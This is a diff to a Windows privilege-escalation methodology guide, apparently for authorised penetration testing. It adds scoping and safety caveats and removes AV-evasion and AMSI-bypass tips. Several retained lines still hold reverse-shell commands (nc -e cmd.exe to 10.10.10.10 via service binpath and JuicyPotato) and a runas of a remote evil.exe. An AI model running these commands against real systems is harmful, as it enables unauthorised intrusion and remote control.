@@ -27,6 +27,8 @@ Provide systematic methodologies for discovering and exploiting privilege escala
 
 ## Core Workflow
 
+Commands below mix `cmd.exe`, PowerShell, Linux tools and tool REPLs; run each only in its stated shell after the root confirmation gate. `%VAR%`, `for /f` and `2>nul` are cmd syntax; PowerShell uses `$env:VAR` and `$null`. Use `sc.exe` explicitly (PowerShell `sc` can be Set-Content). WMIC is legacy/optional on current Windows; use Get-CimInstance where unavailable. A listed privilege, writable folder, missing DLL or old CVE alone is not a confirmed escalation: verify exact build/patch/configuration, effective ACL and execution identity. Preserve original service configuration and restore it/approved test files after validation. Protect/minimize any credential evidence, never upload dumps to public reports.
+
 ### 1. System Enumeration
 
 #### Basic System Information
@@ -208,9 +210,9 @@ accesschk.exe -ucqv <service_name>
 # Look for: SERVICE_ALL_ACCESS, SERVICE_CHANGE_CONFIG
 
 # Exploit vulnerable service
-sc config <service> binpath= "C:\nc.exe -e cmd.exe 10.10.10.10 4444"
-sc stop <service>
-sc start <service>
+sc.exe config <service> binpath= "C:\nc.exe -e cmd.exe 10.10.10.10 4444"
+sc.exe stop <service>
+sc.exe start <service>
 ```
 
 #### Unquoted Service Paths
@@ -260,7 +262,7 @@ whoami /priv
 
 #### Potato Attacks
 ```powershell
-# JuicyPotato (Windows Server 2019 and below)
+# JuicyPotato is legacy/build-dependent; original technique does not work on Windows10 1809/Server2019.
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.10.10 4444 -e cmd.exe" -t *
 
 # PrintSpoofer (Windows 10 and Server 2019)
@@ -329,13 +331,10 @@ runas /savecred /user:WORKGROUP\Administrator "\\10.10.10.10\share\evil.exe"
 # Check for WSL
 wsl whoami
 
-# Set root as default user
-wsl --default-user root
-# Or: ubuntu.exe config --default-user root
-
-# Spawn shell as root
-wsl whoami
-wsl python -c 'import os; os.system("/bin/bash")'
+# Run as the Linux root account in the explicitly selected owned distro
+wsl --distribution Ubuntu --user root -- whoami
+# Linux root inside WSL is not Windows Administrator/SYSTEM.
+# Do not change persistent default-user settings merely to demonstrate access.
 ```
 
 
@@ -390,8 +389,8 @@ C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
 
 | Issue | Cause | Solution |
 |-------|-------|----------|
-| Exploit fails (AV detected) | AV blocking known exploits | Use obfuscated exploits; living-off-the-land (mshta, certutil); custom compiled binaries |
+| Exploit fails (AV detected) | Security control blocks the technique | Record the prevention and stop; control-evasion testing requires separately confirmed scope and a lab |
 | Service won't start | Binary path syntax | Ensure space after `=` in binpath: `binpath= "C:\path\binary.exe"` |
 | Token impersonation fails | Wrong privilege/version | Check `whoami /priv`; verify Windows version compatibility |
 | Can't find kernel exploit | System patched | Run Windows Exploit Suggester: `python wes.py systeminfo.txt` |
-| PowerShell blocked | Execution policy/AMSI | Use `powershell -ep bypass -c "cmd"` or `-enc <base64>` |
+| PowerShell blocked | Policy/control prevents execution | Do not equate execution policy with AMSI or encoding with bypass; document the control and use the approved test process |
